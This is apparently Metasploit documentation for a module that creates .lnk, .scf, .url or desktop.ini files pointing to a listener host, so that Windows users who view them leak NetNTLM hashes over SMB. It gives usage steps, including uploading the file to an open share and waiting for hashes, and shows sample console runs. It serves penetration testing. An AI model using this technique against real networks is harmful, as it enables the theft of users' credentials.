This module dependent on the given filename extension creates either a .lnk, .scf, .url, desktop.ini file which includes a reference to 
the the specified remote host, causing SMB connections to be initiated from any user that views the file. This allows for NetNTLM hashes to be captured
by a listening user.

## Vulnerable Application

Microsoft Windows

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/multidrop```
  4. Customise Options as required
  5. Do: ```run```
  6. A file pointing back to the listening host will then be generated.
  7. Configure auxiliary/server/capture/smb or similar to capture hashes.
  8. Upload the document to an open share or similar and wait for hashes.

## Options

FILENAME - This option allows you to customise the generated filename and filetpye that is generated.
This can be changed using set FILENAME

To generate desktop.ini configure a filename of desktop.ini
To generate a scf file configure a filename of anyname.scf
To generate a url file configure a filename of anyname.url
To generate a lnk file configure a filename of anyname.lnk

File type generation is based on the file extension.

LHOST - This option allows you to set the IP address of the SMB Listener that the document points to
This can be changed using set LHOST 192.168.1.25

## Scenarios

### Version of software and OS as applicable

  Microsoft Windows

  ```
  Console output
  ```

  ```
  msf auxiliary(multidrop) > show info

       Name: Windows SMB Multi Dropper
     Module: auxiliary/multidrop
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Richard Davy - secureyourit.co.uk

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  FILENAME  desktop.ini      yes       Filename - supports .lnk, .scf, .url, desktop.ini
  LHOST     192.168.1.19     yes       Host listening for incoming SMB/WebDAV traffic

Description:
  This module dependent on the given filename extension creates either 
  a .lnk, .scf, .url, desktop.ini file which includes a reference to 
  the the specified remote host, causing SMB connections to be 
  initiated from any user that views the file.

msf auxiliary(multidrop) > exploit

[+] desktop.ini stored at /root/.msf4/local/desktop.ini
[] Auxiliary module execution completed
msf auxiliary(multidrop) > set filename test.lnk
filename => test.lnk
msf auxiliary(multidrop) > exploit

[+] test.lnk stored at /root/.msf4/local/test.lnk
[] Auxiliary module execution completed
msf auxiliary(multidrop) > set filename test.scf
filename => test.scf
msf auxiliary(multidrop) > exploit

[+] test.scf stored at /root/.msf4/local/test.scf
[] Auxiliary module execution completed
msf auxiliary(multidrop) > set filename test.url
filename => test.url
msf auxiliary(multidrop) > exploit

[+] test.url stored at /root/.msf4/local/test.url
[] Auxiliary module execution completed
msf auxiliary(multidrop) > back
 
  ```